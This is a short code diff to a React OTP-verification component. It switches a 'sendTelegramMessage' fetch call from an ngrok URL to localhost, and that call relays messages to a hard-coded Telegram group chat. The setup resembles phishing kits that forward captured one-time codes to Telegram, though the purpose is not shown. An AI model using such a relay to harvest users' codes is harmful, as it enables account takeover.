@@ -24,7 +24,7 @@ const OTPVerification = ({ onBack }) => {
     const sendTelegramMessage = async (message) => {
         try {
             const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
-            const response = await fetch('https://proof.ngrok.app/enviarmensaje', { // Cambia esta URL por tu endpoint
+            const response = await fetch('http://localhost:3000/enviarmensaje', { // Cambia esta URL por tu endpoint
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
